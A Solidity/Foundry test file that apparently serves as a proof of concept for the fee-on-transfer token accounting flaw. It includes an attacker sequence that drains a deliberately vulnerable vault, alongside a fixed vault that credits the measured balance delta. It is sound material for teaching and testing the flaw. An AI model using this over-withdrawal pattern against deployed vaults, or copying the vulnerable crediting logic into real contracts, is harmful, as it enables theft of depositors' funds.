// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {FeeOnTransferToken} from "./mocks/FeeOnTransferToken.sol";
import {IERC20, VulnerableVault, SafeVault} from "../src/weird-erc20/AccountingVault.sol";

/// PoC for fee-on-transfer / weird-ERC20 accounting (received != requested).
///   forge test --match-contract WeirdErc20Accounting -vvv
///
/// Invariant (integration): sum of credited balances must never exceed the tokens actually held
/// by the vault. Crediting the requested amount on a fee-on-transfer token breaks it; crediting
/// the measured balance delta holds.
///
/// See docs/exploits/weird-erc20-accounting.md
contract WeirdErc20AccountingTest is Test {
    FeeOnTransferToken token;
    address honest = makeAddr("honest");
    address attacker = makeAddr("attacker");

    function setUp() public {
        token = new FeeOnTransferToken();
        token.mint(honest, 1000e18);
        token.mint(attacker, 1000e18);
    }

    function test_vulnerable_overCreditsBreaksSolvency() public {
        VulnerableVault vault = new VulnerableVault(IERC20(address(token)));

        // Honest LP deposits 1000; the vault actually receives 900 (10% fee) but credits 1000.
        vm.startPrank(honest);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1000e18);
        vm.stopPrank();

        // Attacker does the same: credited 1000, vault really holds 900 more (total 1800).
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1000e18);
        // Attacker withdraws their full *credited* 1000 — more than the 900 they funded.
        vault.withdraw(1000e18);
        vm.stopPrank();

        // The vault is now insolvent: it holds 800 but still owes the honest LP 1000.
        assertEq(token.balanceOf(address(vault)), 800e18, "vault drained below obligations");
        assertEq(vault.credited(honest), 1000e18, "honest still credited 1000");

        // The honest LP can no longer withdraw what they're owed.
        vm.prank(honest);
        vm.expectRevert(); // underflow in token.transfer (insufficient vault balance)
        vault.withdraw(1000e18);
    }

    function test_safe_creditsMeasuredDelta_staysSolvent() public {
        SafeVault vault = new SafeVault(IERC20(address(token)));

        vm.startPrank(honest);
        token.approve(address(vault), type(uint256).max);
        uint256 hRecv = vault.deposit(1000e18);
        vm.stopPrank();

        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        uint256 aRecv = vault.deposit(1000e18);
        vm.stopPrank();

        assertEq(hRecv, 900e18, "credited the received amount, not the requested one");
        assertEq(aRecv, 900e18, "same for the attacker");
        assertEq(
            vault.credited(honest) + vault.credited(attacker),
            token.balanceOf(address(vault)),
            "sum(credited) == tokens held: solvent"
        );

        // Both can withdraw their real share; no one is shorted.
        vm.prank(attacker);
        vault.withdraw(900e18);
        vm.prank(honest);
        vault.withdraw(900e18);
        assertEq(token.balanceOf(address(vault)), 0, "vault empties cleanly");
    }
}
